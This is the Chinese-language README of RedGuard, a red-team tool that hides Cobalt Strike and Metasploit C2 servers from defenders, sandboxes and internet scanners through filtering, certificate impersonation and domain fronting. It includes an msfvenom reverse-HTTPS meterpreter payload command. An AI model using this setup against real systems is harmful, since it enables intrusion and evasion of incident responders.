<h1 align="center">RedGuard - Excellent C2 Front Flow Control tool</h1>

[![GitHub stars](https://img.shields.io/github/stars/wikiZ/RedGuard)](https://github.com/knownsec/Kunyu) [![GitHub issues](https://img.shields.io/github/issues/wikiZ/RedGuard)](https://github.com/knownsec/Kunyu/issues) [![GitHub release](https://img.shields.io/github/release/wikiZ/RedGuard)](https://github.com/knownsec/Kunyu/releases) [![](https://img.shields.io/badge/author-风起-blueviolet)](https://github.com/wikiZ) 

中文文档 | [English](https://github.com/wikiZ/RedGuard/blob/main/README.md)

![1653117445(1).png](https://github.com/wikiZ/RedGuardImage/raw/main/42d448a4cd030c05bacb8bde759b5d8.png)

# 0x00 介绍

## 工具介绍

RedGuard，是一款C2设施前置流量控制技术的衍生作品，有着更加轻量的设计、高效的流量交互、以及使用go语言开发具有的可靠兼容性。它所解决的核心问题也是在面对日益复杂的红蓝攻防演练行动中，给予攻击队更加优秀的C2基础设施隐匿方案，赋予C2设施的交互流量以流量控制功能，拦截那些“恶意”的分析流量，更好的完成整个攻击任务。

RedGuard是一个C2设施前置流量控制工具，可以避免Blue Team,AVS,EDR,Cyberspace Search Engine的检查。  

## 应用场景

- 攻防演练中防守方根据态势感知平台针对C2交互流量的分析溯源
- 根据JA3指纹库识别防范云沙箱环境下针对木马样本的恶意分析
- 阻止恶意的请求来实施重放攻击，实现混淆上线的效果
- 在明确上线服务器IP的情况下，以白名单的方式限制访问交互流量的请求
- 防范网络空间测绘技术针对C2设施的扫描识别，并重定向或拦截扫描探针的流量
- 支持对多个C2服务器的前置流量控制，并可实现域前置的效果实现负载均衡上线，达到隐匿的效果
- 能够通过请求IP反查API接口针对根据 IP 地址的归属地进行地域性的主机上线限制
- 在不更改源码的情况下，解决分阶段checksum8规则路径解析存在的强特征。
- 通过目标请求的拦截日志分析蓝队溯源行为，可用于跟踪对等连接事件/问题
- 具有自定义对样本合法交互的时间段进行设置，实现仅在工作时间段内进行流量交互的功能
- Malleable C2 Profile 解析器能够严格根据 malleable profile验证入站 HTTP/S 请求，并在违规情况下丢弃外发数据包（支持Malleable Profiles 4.0+）
- 内置大量与安全厂商相关联的设备、蜜罐、云沙箱的IPV4地址黑名单，实现自动拦截重定向请求流量
- 可通过自定义工具与样本交互的SSL证书信息、重定向URL，以规避工具流量的固定特征
- ..........

# 0x01 安装

可以直接下载并使用已经编译好的版本，也可以远程下载go包进行自主编译执行。

```bash
git clone https://github.com/wikiZ/RedGuard.git
cd RedGuard
# 也可以使用upx压缩编译后的文件体积
go build -ldflags "-s -w" -trimpath
# 赋予工具可执行权限，并进行初始化操作
chmod +x ./RedGuard&&./RedGuard

```

# 0x02 配置说明

## 初始化

如下图，首先对RedGuard赋予可执行权限并进行初始化操作，第一次运行会在当前用户目录下生成配置文件，以实现灵活的功能配置，**配置文件名：.RedGuard_CobaltStrike.ini**。

![1653117707(1).png](https://raw.githubusercontent.com/wikiZ/RedGuardImage/main/1656308555577.jpg)

**配置文件内容：**

![1653117707(1).png](https://github.com/wikiZ/RedGuardImage/raw/main/1656310498272.png)

cert的配置选项主要是针对样本与C2前置设施的HTTPS流量交互证书的配置信息，proxy主要用于配置反向代理流量中的控制选项，具体使用会在下面进行详细讲解。

在流量的交互中使用的SSL证书会生成在RedGuard执行所在目录下的cert-rsa/目录下，可以通过修改配置文件进行工具的基础功能启停**(证书的序列号是根据时间戳生成的，不用担心被以此关联特征)**。如果你想要使用自己的证书，只需要重命名为ca.crt和ca.key覆盖在cert-rsa/目录下即可。

```bash
openssl x509 -in ca.crt -noout -text
```

![1653118330(1).png](https://github.com/wikiZ/RedGuardImage/raw/main/1656308972417.jpg)

每次启动RedGuard都会更新随机TLS JARM指纹，防止被以此佐证C2设施。

![1653118330(1).png](https://github.com/wikiZ/RedGuardImage/raw/main/d2d8d30fcd349bd4567c685aaa93451.jpg)

在使用自己证书的情况下，到配置文件中修改HasCert参数为true，防止因为JARM混淆随机化导致的CipherSuites加密套件与自定义证书不兼容导致的无法正常通信问题。

```bash
# Whether to use the certificate you have applied for true/false
HasCert      = false
```

## RedGuard Usage

```bash
root@VM-4-13-ubuntu:~# ./RedGuard -h

Usage of ./RedGuard.exe:
  -DropAction string
        RedGuard interception action (default "redirect")
  -EdgeHost string
        Set Edge Host Communication Domain (default "*")
  -EdgeTarget string
        Set Edge Host Proxy Target (default "*")
  -HasCert string
        Whether to use the certificate you have applied for (default "true")
  -allowIP string
        Proxy Requests Allow IP (default "*")
  -allowLocation string
        Proxy Requests Allow Location (default "*")
  -allowTime string
        Proxy Requests Allow Time (default "*")
  -common string
        Cert CommonName (default "*.aliyun.com")
  -config string
        Set Config Path
  -country string
        Cert Country (default "CN")
  -dns string
        Cert DNSName
  -host string
        Set Proxy HostTarget
  -http string
        Set Proxy HTTP Port (default ":80")
  -https string
        Set Proxy HTTPS Port (default ":443")
  -ip string
        IPLookUP IP
  -locality string
        Cert Locality (default "HangZhou")
  -location string
        IPLookUP Location (default "风起")
  -malleable string
        Set Proxy Requests Filter Malleable File (default "*")
  -organization string
        Cert Organization (default "Alibaba (China) Technology Co., Ltd.")
  -redirect string
        Proxy redirect URL (default "https://360.net")
  -type string
        C2 Server Type (default "CobaltStrike")
  -u    Enable configuration file modification
  
```

**P.S. 可以使用参数命令的方式修改配置文件，当然我觉得可能直接vim手动修改更方便。**

# 0x03 工具使用

## 基础拦截

如果直接对反向代理的端口进行访问，则会触发拦截规则，这里通过输出的日志可以看到客户端请求根目录，但是因为其请求过程未带有请求的凭证，也就是正确的HOST请求头所以触发了基础拦截的规则，流量被重定向到了https://360.net

这里为了方便展示输出效果，实际使用可以通过`nohup ./RedGuard &`后台运行。

![1653130661(1).png](https://github.com/wikiZ/RedGuardImage/raw/main/1656309416534.png)

```bash
{"360.net":"http://127.0.0.1:8080","360.com":"https://127.0.0.1:4433"}
```

从上面的slice不难看出，360.net对应了代理到本地8080端口，360.com指向了本地的4433端口，且对应了使用的HTTP协议的不同，在后续上线中，需要注意监听器的协议类型需要和这里设置的保持一致，并设置对应HOST请求头。

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/1656309543334.jpg)

如上图，在未授权情况下，我们得到的响应信息也是重定向的站点返回信息。

## 拦截方式

上述的基础拦截案例中，使用的是默认的拦截方式，也就是将非法流量以重定向的方式拦截，而通过配置文件的修改，我们可以更改拦截的方式，以及重定向的站点URL，其实这种方式与之说是重定向，描述为劫持、克隆或许更贴切，因为返回的响应状态码为200，是从另一个网站获取响应，以尽可能接近地模仿克隆/劫持的网站。

无效数据包可能会根据三种策略被错误路由：

- **reset**：立即终止 TCP 连接。
- **proxy**：从另一个网站获取响应，以尽可能接近地模仿克隆/劫持的网站。
- **redirect**：重定向到指定网站返回HTTP状态码302，对重定向的网站无要求。

```bash
# RedGuard interception action: redirect / rest / proxy (Hijack HTTP Response)
drop_action   = proxy
# URL to redirect to
Redirect      = https://360.net
```

配置文件中 **Redirect = URL**  指向的就是劫持的URL地址，RedGuard支持“热更改”，也就是说在工具通过nohup这种方式在后台运行的过程中，我们依旧可以通过修改配置文件的内容进行实时的功能启停。

```bash
./RedGuard -u --drop true
```

注意，通过命令行修改配置文件的时候。-u选项不要少，否则无法对配置文件修改成功，如果需要还原默认配置文件设置只需要输入 `./RedGuard -u` 即可。

而另一种拦截方式就是DROP，直接Close HTTP通信响应，通过设置 **DROP = true** 启用，具体拦截效果如下图：

![1653132755(1).png](https://github.com/wikiZ/RedGuardImage/raw/main/1656310664285.jpg)

可以看到，没有获取到HTTP响应码，C2前置流量控制对非法请求直接close响应，在网络空间测绘的探测中，DROP的方式可以实现隐藏端口开放情况的作用，具体效果可以看下面的案例分析。

## JA3指纹识别云沙箱分析流量

RedGuard目前已支持基于JA3指纹识别云沙箱的功能，可以对云沙箱环境下发起的网络请求进行识别并拦截，防止以此其进行后续的通联性分析，从而进一步影响C2设施安全性。

目前支持针对微步云沙箱的识别拦截作为效果演示

![1653132755(1).png](https://github.com/wikiZ/RedGuardImage/raw/main/ebd60b93323db5096328e8f20a2f1df.jpg)

## 代理端口修改

这里其实就很好理解了，对配置文件中以下两个参数的配置实现更改反向代理端口的效果，这里建议在不与当前服务器端口冲突的前提下，使用默认的端口隐匿性会更好，如果一定要修改，那么注意参数值的 **:** 不要缺少

```bash
# HTTPS Reverse proxy port
Port_HTTPS = :443
# HTTP Reverse proxy port
Port_HTTP = :80
```

## RedGuard日志

通过目标请求的拦截日志分析蓝队溯源行为，可用于跟踪对等连接事件/问题，日志文件生成在运行RedGuard所在目录下，**文件名：RedGuard.log**。

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/1656310909975.jpg)

## RedGuard获取真实IP地址

针对于日常、域前置场景下获取真实请求IP，RG无需进行任何配置，仅需对启动C2设施的profile文件增加以下配置，即通过请求头X-Forwarded-For获取目标真实IP。

```bash
http-config {
    set trust_x_forwarded_for "true";
}
```

## 请求地域限制

配置方式以AllowLocation = 济南,北京 为例，这里值得注意的是，RedGuard提供了两个IP归属地反查的API，一个适用于国内用户，另一个适用于海外用户，并且可以根据输入的地域名动态的分配使用哪个API，如果目标是中国的那么设置的地域就输入中文，反之输入英文地名，建议国内的用户使用中文名即可，这样反查到的归属地准确度以及API的响应速度都是最好的选择。

P.S. 国内用户，不要使用**AllowLocation = 济南,beijing**这种方式！没啥意义，参数值的首个字符决定使用哪个API！

```bash
# IP address owning restrictions example:AllowLocation = 山东,上海,杭州 or shanghai,beijing
AllowLocation = *
```

![1653134160(1).png](https://github.com/wikiZ/RedGuardImage/raw/main/1656311033506.jpg)

决定限制地域之前，可以通过以下命令手动查询IP地址归属地。

```bash
./RedGuard --ip 111.14.218.206
./RedGuard --ip 111.14.218.206 --location shandong # 使用海外API查询归属地
```

这里我们设置仅允许山东地域上线

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/20220521200158-d0d34d6c-d8fd-1.png)

**合法流量：**

![1653137496(1).png](https://github.com/wikiZ/RedGuardImage/raw/main/20220521205147-c6bb200a-d904-1.png)

**非法请求地域：**

![1653137621(1).png](https://github.com/wikiZ/RedGuardImage/raw/main/20220521205347-0dbc1efa-d905-1.png)

关于地域限制的上线，在目前的攻防演练可能比较实用，基本上省市级的护网限制的目标都是在指定区域中，而对于其他地域请求的流量自然可以忽略不计，而RedGuard这一功能不仅仅可以限制单一地域也可以根据省、市限制多个上线地域，而对其他地域请求的流量进行拦截。

## 基于白名单拦截

除了RedGuard内置的安全厂商IP的黑名单，我们还可以依据白名单的方式进行限制，其实我也是建议在web打点的时候，我们可以根据白名单限制上线的IP的地址，以，分割多个IP地址的方式。

```bash
# Whitelist list example: AllowIP = 172.16.1.1,192.168.1.1
AllowIP       = 127.0.0.1
```

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/1656311197849.png)

如上图，我们限制仅允许127.0.0.1上线，那么其他IP的请求流量就会被拦截。

## 基于时间段拦截

这个功能就比较有意思了，在配置文件中设置以下参数值，代表了流量控制设施仅可以上午8点至晚上9点上线，这里具体的应用场景也就是在指定攻击时间内，我们允许与C2进行流量交互，其他时间保持静默状态。这也能让红队们睡一个好觉，不用担心一些夜班的蓝队无聊去分析你的木马，然后醒来发生不可描述的事情，哈哈哈。

```bash
# Limit the time of requests example: AllowTime = 8:00 - 16:00
AllowTime     = 8:00 - 21:00
```

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/1656311327769.png)

## Malleable Profile

RedGuard采用 Malleable C2 配置文件。然后，它解析提供的可延展配置文件部分以了解合同并仅通过那些满足它的入站请求，同时误导其他请求。诸如`http-stager`,`http-get`和`http-post`它们对应的 uris, headers, User-Agent 等部分都用于区分合法信标的请求和不相关的 Internet 噪声或 IR/AV/EDR 越界数据包。

```bash
# C2 Malleable File Path
MalleableFile = /root/cobaltstrike/Malleable.profile
```

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/1656311591693.png)

风起编写的profile，推荐使用：

> https://github.com/wikiZ/CobaltStrike-Malleable-Profile

## Sample FingerPrint

RedGuard 23.05.13已更新木马样本指纹识别功能，该功能基于对Malleable Profile自定义设置HTTP Header字段，作为该指纹“**样本Salt值**”为相同**C2监听器/**Header Host提供唯一辨识并结合其他相关请求字段生成木马样本指纹，用于自定义样本存活性。根据攻击方任务需求，针对希望失效的样本进行**“下线操作”**，更好的规避恶意研判流量的样本通联性关联及分阶段样本PAYLOAD攻击载荷获取分析，给予攻击方更加个性化的隐匿措施。

针对不同C2监听器，我们可以设置不同Malleable Profile配置别称并自定义相关header的字段名及值，作为样本Salt值并以此作为区分不同样本之间的辨识之一。下列代码是为了方便说明，而在实际攻防场景下我们可以给予更加贴合实际的HTTP请求包字段作为判断依据。

```bash
http-get "listen2" {
	set uri "/image.gif";
	client {
		header "Accept-Finger" "866e5289337ab033f89bc57c5274c7ca"; //用户自定义字段名及值
		metadata {
			print
		}
	}
}
```

**HTTP流量**

![image.png](https://raw.githubusercontent.com/wikiZ/RedGuardImage/main/10b7b4d8f1d66bbf98e404332bf5d87.png)

如图所示，我们根据上述样本Salt值及Host字段作为指纹生成依据，这里我们已知:

- **Salt值：866e5289337ab033f89bc57c5274c7ca**
- **Host字段值：redguard.com**

这里根据对上述值进行拼接得到sample指纹为：

```bash
22e6db08c5ef1889d64103a290ac145c
```

目前已知上述样本指纹，现在我们在RedGuard配置文件中设置自定义的Header字段及样本指纹用于恶意流量拦截，值得注意的是我们可以拓展多个样本指纹，不同指纹之间以逗号分隔，FieldName需要和Malleable Profile中配置的Header字段名称达成一致。

![image.png](https://raw.githubusercontent.com/wikiZ/RedGuardImage/main/aa7488ece6370ff2559400a108664a4.png)

因为RedGuard的配置文件为热配置，所以这里我们不需要重新启停RG即可实现针对希望失效的样本进行拦截，当我们希望该样本重新生效时，只需在RG配置文件中删除相关样本指纹即可实现。

**演示效果**

![image.png](https://raw.githubusercontent.com/wikiZ/RedGuardImage/main/4d37798254ba9b5729ac886f90a10f7.png)

# 0x04 案例分析

## 空间测绘

如下图所示，当我们的拦截规则设置为DROP的时候，空间测绘系统探针会对我们反向代理端口的/目录进行几次探测，理论上测绘发送的请求包就是伪造成正常的流量所示。但是当尝试几次因为请求包特征不符合RedGuard的放行要求，所以均被Close HTTP响应。最终展现在测绘平台上的效果也就是认为反向代理端口未开放。

![image.png](https://raw.githubusercontent.com/wikiZ/RedGuardImage/main/1656312184116.png)

下图所示的流量也就是当拦截规则设置为Redirect时，我们会发现当测绘探针收到响应后会继续对我们进行目录扫描，UserAgent为随机，看起来符合正常流量的请求，但是也都成功被拦截了。

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/1656312557035.png)

**测绘平台 - 劫持响应拦截方式效果：**

![1653200439(1).jpg](https://github.com/wikiZ/RedGuardImage/raw/main/1656313188878.png)

**测绘平台 - 重定向拦截方式效果：**

![1653200439(1).jpg](https://github.com/wikiZ/RedGuardImage/raw/main/1656406644535.jpg)

## 域前置

RedGuard是支持域前置的，在我看来一共有两种展现形式，一种是利用传统的域前置方式，在全站加速回源地址中设置为我们反向代理的端口即可实现。在原有的基础上给域前置增加了流量控制的功能，并且可以根据我们设置的重定向到指定URL使其看起来更像是真的。需要注意HTTPS HOST头RedGuard设置的要与全站加速的域名一致才可以。

![1653201007(1).png](https://github.com/wikiZ/RedGuardImage/raw/main/20220522143012-a26ab442-d998-1.png)

在单兵作战中，我建议可以使用上述方式，而在团队任务中，也可以通过自建“域前置”的方式来实现。 

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/20220522143837-cf77a944-d999-1.png)

在自建域前置中，保持多个反向代理端口一致，HOST头一致指向后端真实的C2服务器监听端口。而这种方式，可以很好的隐藏我们的真实C2服务器，而反向代理的服务器可以通过配置防火墙仅开放代理端口即可。

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/1656313773114.jpg)

这里可以通过多个节点服务器实现，在CS监听器HTTPS上线IP配置多个我们的节点IP。

## 边缘节点

RedGuard 22.08.03更新了边缘主机上线设置-自定义内网主机交互域名，而边缘主机使用域前置CDN节点交互。达到了两台主机之间交互信息的不对称，使溯源难度更大，难以排查。

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/66b9e60fb8303b3c6b457cc8134a436.png)

## CobaltStrike上线

如果说上面的这种方式有一个问题就是，实际上线的C2服务器是不能通过防火墙直接拦截掉的，因为在反向代理中实际进行负载均衡请求的是云服务器厂商IP进行的。

如果是单兵作战的话，我们可以在云服务器防火墙设置拦截策略。

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/20220522150356-58b9586c-d99d-1.png)

然后把代理指向的地址设置为https://127.0.0.1:4433这种即可。

```bash
{"360.net":"http://127.0.0.1:8080","360.com":"https://127.0.0.1:4433"}
```

而且因为我们的基础验证就是基于HTTP HOST请求头来做的，所以在HTTP流量中看到的也是与域前置的方式一致，但是成本更低，只需要一台云服务器即可实现。

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/20220522150942-26f6c264-d99e-1.png)

对于监听器的设置上线端口设置为RedGuard反向代理端口，监听端口为本机实际上线端口。

## Metasploit上线

**生成木马**

```bash
$ msfvenom -p windows/meterpreter/reverse_https LHOST=vpsip LPORT=443 HttpHostHeader=360.com 
-f exe -o ~/path/to/payload.exe
```

当然作为域前置场景也可以把你的LHOST配置为任意使用该厂商CDN的域名，注意设置HttpHostHeader与RedGuard相符即可。

```bash
setg OverrideLHOST 360.com
setg OverrideLPORT 443
setg OverrideRequestHost true
```

请务必注意，该`OverrideRequestHost`设置必须设置为`true`。这是由于 Metasploit 在为暂存有效负载生成配置时默认处理传入 HTTP/S 请求的方式的一个怪癖。默认情况下，Metasploit 将传入请求的`Host`标头值（如果存在）用于第二阶段配置，而不是`LHOST`参数。因此，将生成阶段配置，以便将请求直接发送到您的隐藏域名，因为 CloudFront 在转发请求的`Host`标头中传递您的内部域。这显然不是我们所要求的。使用`OverrideRequestHost`配置值，我们可以强制 Metasploit 忽略传入`Host`的标头，而是使用`LHOST`指向原始 CloudFront 域的配置值。

监听器设置为实际上线端口，与RedGuard实际转发到的地址相匹配。

![867551fe860b10ca1396498a85422b4.jpg](https://github.com/wikiZ/RedGuardImage/raw/main/73315c83562826f16f64e2b277736c1.png)

RedGuard接收到请求：

![867551fe860b10ca1396498a85422b4.jpg](https://github.com/wikiZ/RedGuardImage/raw/main/159a00e6c5596bc3542701b4a8020b1.png)

# 0x05 Loading

感谢各位用户的支持，RedGuard也会坚持进行完善更新的，希望 RedGuard 能够让更多安全从业者所知，工具参考了RedWarden的设计思想。

**欢迎大家多多提出需求，RedGuard也会在这些需求中不断地成长，完善！**

**关于开发者 风起 相关文章：https://www.anquanke.com/member.html?memberId=148652**

> 2022Kcon黑客大会兵器谱作者
>
> 第十届ISC互联网安全大会 高级攻防论坛《C2设施前置流量控制技术》议题
>
> https://isc.n.cn/m/pages/live/index?channel_id=iscyY043&ncode=UR6KZ&room_id=1981905&server_id=785016&tab_id=253
> 
> 基于边界节点链路交互C2流量
> https://www.anquanke.com/post/id/278140
>
> 云沙箱流量识别技术剖析
>
> https://www.anquanke.com/post/id/277431
>
> JARM指纹随机化技术实现
>
> https://www.anquanke.com/post/id/276546

**Kunyu: https://github.com/knownsec/Kunyu**

> 风起于青萍之末，浪成于微澜之间。


# 0x06 Community

如果有问题或者需求可以在项目下提交issue，或通过添加WeChat联系工具作者。

![867551fe860b10ca1396498a85422b4.jpg](https://github.com/wikiZ/RedGuardImage/raw/main/20220522141706-ce37e178-d996-1.png)
